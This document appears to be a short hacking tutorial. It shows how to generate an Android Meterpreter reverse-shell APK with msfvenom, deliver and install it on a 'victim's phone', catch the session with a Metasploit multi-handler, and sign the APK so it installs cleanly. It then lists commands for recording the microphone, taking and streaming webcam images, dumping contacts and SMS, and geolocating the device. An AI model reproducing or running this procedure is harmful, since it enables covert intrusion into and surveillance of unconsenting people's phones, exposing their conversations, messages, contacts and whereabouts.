
# STEPS :

Start apache2
```
~ # apache2ctl start
```

. Set payload and create custom windows executable.
Command:
```
    root@kali:-# msfvenom -p android/meterpreter/reverse_tcp  LHOST=192.168.0.110 LPORT=4444 R > andro.apk 
```
(To know your LHOST, open new terminal and type ifconfig )

Your apk file is being saved in the Home folder.

Note: Don't add any stray space characters anywhere. Use the command as is (after changing the LHOST and LPORT as needed).

. Transfer/mail this file (here andro.apk) file to the victim's phone and install it.

. Start the metasploit framework console as follows :
         
Command:
```
    root@kali:-# msfconsole
```

. Now it's time to open and setup multi-handler. Follows the steps :
```
    msf  > use multi/handler
    msf exploit(handler) > set payload android/meterpreter/reverse_tcp
    msf exploit(handler) > set LHOST 192.168.0.110
    msf exploit(handler) > set LPORT 4444
    msf exploit(handler) > exploit
```

        Payload Handler is being started........

. When the victims clicks on the app(installed as MAIN ACTIVITY in the menu) in his phone, meterpreter session will be established.

Exploits:

. Try the following exploit commands :
```
    - record_mic
    - webcam_snap
    - webcam_stream
    - dump_contacts
    - dump_sms
    - geolocate
 ```
************************************************************************
Error fixing(incase you get PARSE ERROR)

Two methods:

```
1)Type command "d2j-apk-sign andro.apk" 
```  
  or
```  
 2) To fix this error download signapk - Click here to download
```
Steps to follow
```
    Open Signapk folder then open cmd.
    Copy the andro.apk(the app you made) in Signapk folder.
    Type java -" jar signapk.jar certificate.pem key.pk8 andro.apk andro-signed.apk "in cmd(not double quotes).
    copy it in your phone and install it.
```
# Have fun with nu11secur1ty
